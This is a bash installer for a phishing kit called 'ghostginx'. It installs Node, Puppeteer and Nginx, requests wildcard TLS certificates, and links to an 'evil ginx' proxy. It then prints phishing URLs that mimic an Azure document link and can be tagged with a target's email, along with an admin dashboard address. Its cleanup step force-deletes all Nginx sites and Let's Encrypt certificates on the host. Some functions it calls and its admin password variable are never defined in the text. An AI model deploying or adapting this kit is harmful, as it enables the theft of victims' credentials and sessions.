#!/bin/bash

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Function to print colored status messages
print_status() {
  echo -e "${GREEN}[*] $1${NC}"
}

print_warning() {
  echo -e "${YELLOW}[!] $1${NC}"
}

print_error() {
  echo -e "${RED}[-] $1${NC}"
}

# Function to prompt for domain name
get_domain_name() {
  read -p "Enter your domain name (e.g., example.com): " DOMAIN_NAME
  echo $DOMAIN_NAME
}

# Function to get server IP
get_server_ip() {
  # Try to get IPv4 address, fallback to hostname if not found
  SERVER_IP=$(curl -s4 ifconfig.me || hostname -I | awk '{print $1}')
  echo $SERVER_IP
}

# Function to install base dependencies
install_base_deps() {
  print_status "Installing base dependencies..."
  sudo apt update
  sudo apt install -y git wget curl
  curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
  sudo apt install -y nodejs

  # Install required npm packages from app.js
  npm install express \
    cors \
    puppeteer \
    winston \
    uuid \
    ua-parser-js \
    geoip-lite \
    net \
    dns \
    https \
    form-data \
    axios \
    crypto \
    path \
    fs \
    dotenv

  # Install PM2 globally
  sudo npm install -g pm2
}

# Function to install Puppeteer dependencies
install_puppeteer_deps() {
  print_status "Installing Puppeteer dependencies..."
  
  sudo apt update
  
  # Install core dependencies (fixed package names)
  sudo apt install -y \
    libasound2t64 \
    libx11-6 \
    libxcomposite1 \
    libxcursor1 \
    libxdamage1 \
    libxext6 \
    libxi6 \
    libxtst6 \
    libcups2t64 \
    libxrandr2 \
    libxrender1 \
    libdrm2 \
    libgtk-3-0t64 \
    libgbm1 \
    libatk1.0-0t64 \
    libc6 \
    libcairo2 \
    libdbus-1-3 \
    libexpat1 \
    libfontconfig1 \
    libgcc-s1 \
    libglib2.0-0t64 \
    libnspr4 \
    libpango-1.0-0 \
    libpangocairo-1.0-0 \
    libstdc++6 \
    libx11-xcb1 \
    libxcb1 \
    libxfixes3 \
    libxss1 \
    ca-certificates \
    fonts-liberation \
    libnss3 \
    lsb-release \
    xdg-utils \
    wget

  # Install Chrome browser
  if ! command -v google-chrome &> /dev/null; then
    wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
    sudo apt install -y ./google-chrome-stable_current_amd64.deb
    rm google-chrome-stable_current_amd64.deb
  fi

  # Install Puppeteer
  npm install puppeteer
}

# Function to cleanup and reinstall Nginx
setup_nginx() {
  local domain=$1
  print_status "Setting up Nginx..."
  
  # Install Nginx if not already installed
  sudo apt install -y nginx

  # Create basic Nginx configuration first (HTTP only)
  sudo tee /etc/nginx/sites-available/${domain}.conf > /dev/null << EOF
server {
    listen 80;
    server_name *.${domain} ${domain};
    
    location / {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host \$host;
        proxy_cache_bypass \$http_upgrade;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
    }
}
EOF

  # Create symlink
  sudo ln -sf /etc/nginx/sites-available/${domain}.conf /etc/nginx/sites-enabled/
  
  # Remove default site if it exists
  sudo rm -f /etc/nginx/sites-enabled/default

  # Test and reload Nginx
  if sudo nginx -t; then
    print_status "Nginx configuration test passed"
    sudo systemctl restart nginx
  else
    print_error "Nginx configuration test failed"
    print_error "Checking Nginx error log..."
    sudo tail -n 20 /var/log/nginx/error.log
    exit 1
  fi

  # Install Certbot
  print_status "Installing Certbot..."
  sudo apt install -y certbot python3-certbot-nginx

  # Let user choose SSL setup method
  print_status "Would you like to:"
  echo "1) Setup SSL for specific subdomains"
  echo "2) Setup wildcard SSL certificate"
  read -p "Enter your choice (1 or 2): " ssl_choice

  if [ "$ssl_choice" = "1" ]; then
    read -p "Enter subdomains (space-separated, e.g., www login auth): " subdomains
    cert_domains=""
    for subdomain in $subdomains; do
      cert_domains="$cert_domains -d $subdomain.$domain"
    done
    sudo certbot --nginx -d $domain $cert_domains
  else
    print_status "For wildcard certificate, you'll need to add a DNS TXT record"
    sudo certbot certonly --manual --preferred-challenges dns \
      -d "*.$domain" \
      -d "$domain" \
      --server https://acme-v02.api.letsencrypt.org/directory
  fi
}

# Function to setup SSL with Certbot
setup_ssl() {
  local domain=$1
  print_status "Installing Certbot..."
  sudo apt install -y certbot python3-certbot-nginx

  print_status "Would you like to:"
  echo "1) Setup SSL for specific subdomains"
  echo "2) Setup wildcard SSL certificate"
  read -p "Enter your choice (1 or 2): " ssl_choice

  if [ "$ssl_choice" = "1" ]; then
    read -p "Enter subdomains (space-separated, e.g., www login auth): " subdomains
    cert_domains=""
    for subdomain in $subdomains; do
      cert_domains="$cert_domains -d $subdomain.$domain"
    done
    sudo certbot --nginx -d $domain $cert_domains
  else
    print_status "For wildcard certificate, you'll need to add a DNS TXT record"
    sudo certbot certonly --manual --preferred-challenges dns \
      -d "*.$domain" \
      -d "$domain" \
      --server https://acme-v02.api.letsencrypt.org/directory
  fi
}

# Function to handle port conflicts
handle_port_conflict() {
  print_warning "Checking for port conflicts..."
  
  # First stop PM2 processes
  if command -v pm2 &> /dev/null; then
    print_status "Stopping PM2 processes..."
    pm2 stop all >/dev/null 2>&1
    pm2 delete all >/dev/null 2>&1
  fi
  
  # Then kill any remaining processes on port 3000
  if lsof -i:3000 >/dev/null 2>&1; then
    print_status "Port 3000 is in use. Forcing termination..."
    sudo fuser -k 3000/tcp >/dev/null 2>&1
    sleep 2  # Give processes time to terminate
  fi
}

# Function to setup logging
setup_logging() {
  print_status "Setting up logging..."
  
  # Create logs directory if it doesn't exist
  mkdir -p logs
  
  # Create PM2 ecosystem file with enhanced logging
  cat > ecosystem.config.js << EOF
module.exports = {
  apps: [{
    name: "ghostginx",
    script: "app.js",
    watch: true,
    log_date_format: "YYYY-MM-DD HH:mm:ss",
    out_file: "logs/app.log",
    error_file: "logs/error.log",
    merge_logs: true,
    max_memory_restart: "1G",
    env: {
      NODE_ENV: "production",
      DEBUG: "*"
    },
    log_type: "json",
    timestamp: true
  }]
}
EOF

  # Setup Nginx detailed logging
  sudo tee /etc/nginx/conf.d/logging.conf > /dev/null << EOF
error_log /var/log/nginx/error.log debug;
access_log /var/log/nginx/access.log combined buffer=512k flush=1m;
EOF

  # Restart Nginx to apply logging changes
  sudo systemctl restart nginx
  
  print_status "To view application logs in real-time, use:"
  echo "pm2 logs ghostginx"
  echo "To view error logs:"
  echo "tail -f logs/error.log"
  echo "To view Nginx error logs:"
  echo "sudo tail -f /var/log/nginx/error.log"
}

# Function to cleanup previous installations
cleanup_previous_install() {
  print_status "Cleaning up previous installations..."
  
  # Remove existing nginx configurations
  print_status "Removing existing Nginx configurations..."
  sudo rm -f /etc/nginx/sites-enabled/*
  sudo rm -f /etc/nginx/sites-available/*
  
  # Remove SSL certificates and all related files
  print_status "Removing existing SSL certificates..."
  sudo rm -rf /etc/letsencrypt/live/*
  sudo rm -rf /etc/letsencrypt/archive/*
  sudo rm -rf /etc/letsencrypt/renewal/*
  sudo rm -rf /etc/letsencrypt/keys/*
  sudo rm -rf /var/lib/letsencrypt/*
  sudo rm -f /var/log/letsencrypt/*
  
  # Remove certbot cache and renewal information
  print_status "Clearing Certbot cache..."
  sudo rm -rf ~/.local/share/certbot/*
  sudo rm -rf /var/cache/certbot/*
  
  # Stop any running processes
  print_status "Stopping running processes..."
  if command -v pm2 &> /dev/null; then
    pm2 stop all >/dev/null 2>&1
    pm2 delete all >/dev/null 2>&1
  fi
  
  # Kill any processes using port 3000
  if lsof -i:3000 >/dev/null 2>&1; then
    sudo kill -9 $(lsof -t -i:3000) >/dev/null 2>&1
  fi
  
  # Restart Nginx to clear any cached configurations
  sudo systemctl restart nginx
  
  print_status "Cleanup completed successfully"
}

# Add this function at the top with other utility functions
verify_app_setup() {
  if [ ! -f "app.js" ]; then
    print_error "app.js not found"
    print_error "Installation failed"
    exit 1
  fi
  
  if [ ! -f "package.json" ]; then
    print_error "package.json not found"
    print_error "Installation failed"
    exit 1
  fi
  
  # Verify npm dependencies
  print_status "Installing npm dependencies..."
  npm install --no-audit --no-fund || {
    print_error "Failed to install npm dependencies"
    exit 1
  }

  # Install additional dependencies for dashboard
  print_status "Installing dashboard dependencies..."
  npm install geoip-lite ua-parser-js ipinfo || {
    print_error "Failed to install dashboard dependencies"
    exit 1
  }
}

# Main installation flow
main() {
  print_status "Starting installation..."
  
  # Create logs directory at the root
  mkdir -p logs
  chmod 755 logs
  
  # Get server IP
  SERVER_IP=$(get_server_ip)
  
  # Clean up previous installations first
  cleanup_previous_install
  
  # Get domain name
  DOMAIN_NAME=$(get_domain_name)
  
  # Get evil ginx link
  read -p "Enter your evil ginx link: " EVIL_GINX_LINK
  
  # Install dependencies
  install_base_deps
  install_puppeteer_deps
  
  # Setup Nginx
  setup_nginx $DOMAIN_NAME
  
  # Prompt for SSL setup
  read -p "Would you like to setup SSL now? (y/n): " setup_ssl_now
  if [ "$setup_ssl_now" = "y" ]; then
    setup_ssl $DOMAIN_NAME
  fi
  
  # Setup application
  setup_app $EVIL_GINX_LINK
  
  # Handle port conflicts and start app
  handle_port_conflict
  
  # Setup logging
  setup_logging
  
  # Add this line in the main function after setup_app
  setup_dashboard
  
  print_status "Installation completed!"
  print_warning "Don't forget to:"
  echo "1. Configure your DNS records to point to your server IP"
  echo "2. View logs using: pm2 logs ghostginx"
  
  # Print access URL information
  print_status "Access URL Information:"
  echo "Your phishing page will be available at:"
  echo -e "${GREEN}Domain access:${NC}"
  echo -e "${GREEN}https://${DOMAIN_NAME}/cUTFD7QW6GYUEWYIY87GoIBUYVYVYTYVYDYTDOCAZURESILES/IBYGE7F73737V76F8VekU9JnVpZD1VU0VSMTIwOTIwMjRVNDUwOTEyMTg=N0123N${NC}"
  echo -e "With email: ${YELLOW}https://${DOMAIN_NAME}/cUTFD7QW6GYUEWYIY87GoIBUYVYVYTYVYDYTDOCAZURESILES/IBYGE7F73737V76F8VekU9JnVpZD1VU0VSMTIwOTIwMjRVNDUwOTEyMTg=N0123N?id=[EMAIL]${NC}"
  
  echo -e "\n${GREEN}Direct IP access:${NC}"
  echo -e "${GREEN}http://${SERVER_IP}:3000/cUTFD7QW6GYUEWYIY87GoIBUYVYVYTYVYDYTDOCAZURESILES/IBYGE7F73737V76F8VekU9JnVpZD1VU0VSMTIwOTIwMjRVNDUwOTEyMTg=N0123N${NC}"
  echo -e "With email: ${YELLOW}http://${SERVER_IP}:3000/cUTFD7QW6GYUEWYIY87GoIBUYVYVYTYVYDYTDOCAZURESILES/IBYGE7F73737V76F8VekU9JnVpZD1VU0VSMTIwOTIwMjRVNDUwOTEyMTg=N0123N?id=[EMAIL]${NC}"

  # Print admin dashboard access information
  echo -e "\n${GREEN}Admin Dashboard Access:${NC}"
  echo -e "${GREEN}Domain access:${NC}"
  echo -e "${GREEN}https://${DOMAIN_NAME}/admin${NC}"
  echo -e "\n${GREEN}Direct IP access:${NC}"
  echo -e "${GREEN}http://${SERVER_IP}:3000/admin${NC}"
  
  # Print admin credentials
  echo -e "\n${YELLOW}Admin Dashboard Credentials:${NC}"
  echo -e "Username: ${GREEN}admin${NC}"
  echo -e "Password: ${GREEN}${ADMIN_PASSWORD}${NC}"
  
  # Save credentials to a file
  echo -e "\nSaving credentials to credentials.txt..."
  cat > credentials.txt << EOF
Admin Dashboard URLs:
Domain: https://${DOMAIN_NAME}/admin
IP: http://${SERVER_IP}:3000/admin

Credentials:
Username: admin
Password: ${ADMIN_PASSWORD}
EOF
  chmod 600 credentials.txt
  
  print_warning "Credentials have been saved to credentials.txt. Keep this file secure!"
}

# Run the script
main
